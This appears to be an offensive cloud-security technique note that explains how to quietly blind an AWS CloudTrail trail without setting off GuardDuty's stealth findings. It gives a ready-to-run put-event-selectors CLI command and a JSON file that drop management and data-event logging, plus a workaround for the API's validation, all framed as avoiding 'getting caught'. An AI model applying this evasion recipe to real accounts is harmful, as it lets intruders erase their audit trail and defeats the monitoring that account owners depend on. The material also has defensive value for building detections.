There are two AWS GuardDuty finding types that trigger when a CloudTrail trail is disabled or has its configuration modified:

- [Stealth:IAMUser/CloudTrailLoggingDisabled](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth2)
- [Stealth:IAMUser/LoggingConfigurationModified](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_stealth.html#stealth3)

This means we cannot use the `cloudtrail:DeleteTrail`, `cloudtrail:UpdateTrail`, or `cloudtrail:StopLogging` APIs without getting caught shortly after.

To get around this, we can use the `cloudtrail:PutEventSelectors` API and configure the event selectors in a way that nothing besides KMS events are logged. Before KMS events were introduced, it was possible to completely disable a trail with this method, but now we need to leave KMS events enabled. This shouldn't be a big deal and still will not log most of your activity.

We can abuse this with the following command:

- `aws cloudtrail put-event-selectors --trail-name NAME --region REGION --event-selectors file://eventselectors.json`

The `eventselectors.json` file should have the following contents:

```
[
    {
        "ReadWriteType": "ReadOnly",
        "IncludeManagementEvents": false,
        "DataResources": [
            {
                "Type": "AWS::S3::Object",
                "Values": []
            },
            {
                "Type": "AWS::Lambda::Function",
                "Values": []
            }
        ]
    }
]
```

This configuration instructs the trail to ignore management events and data events. If the "DataResources" field was an empty array, our API call would be denied, but by specifying S3 buckets and Lambda functions, even though they are empty, we can bypass the error. This configuration does not disable KMS management events because that's not possible with what we want to do, but those types of events should not be the reason you get caught. 

Note that this does not work through the web console because of some validation in place that the CLI does not seem to follow.